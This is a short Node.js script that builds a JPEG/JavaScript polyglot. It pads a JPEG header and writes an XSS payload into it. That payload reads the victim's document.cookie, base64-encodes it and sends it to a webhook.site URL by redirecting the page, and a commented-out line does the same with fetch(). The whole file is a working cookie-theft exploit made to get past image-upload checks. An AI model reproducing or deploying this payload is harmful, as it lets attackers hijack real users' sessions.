const fs = require('fs');

// var payload = `*/fetch("https://webhook.site/8a6f8112-2fb8-4863-aa73-e82b2b15fda2?cookie=".concat(document.cookie))/*`
var payload = `*/=xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","/",false);xmlhttp.send();r=xmlhttp.responseText;location.href='https://webhook.site/8a6f8112-2fb8-4863-aa73-e82b2b15fda2/?q='+btoa(document.cookie);/*`
var len = 12074 - 16 - payload.length
var a = fs.readFileSync('./xss_within_header_compressed_small_logo.jpg')
var b = a.toString("hex")
var c = b.substr(0,40)
var d = Array(len).fill("00").join("")
var e = payload.split("").map(function(e){return e.charCodeAt(0).toString(16)}).join("")
var f = b.substr(40,b.length)
var g = c + d + e + f
var h = Buffer.from(g,"hex")
var i = fs.writeFile("test_new.jpeg", h, (error) => {if (error) throw err; })
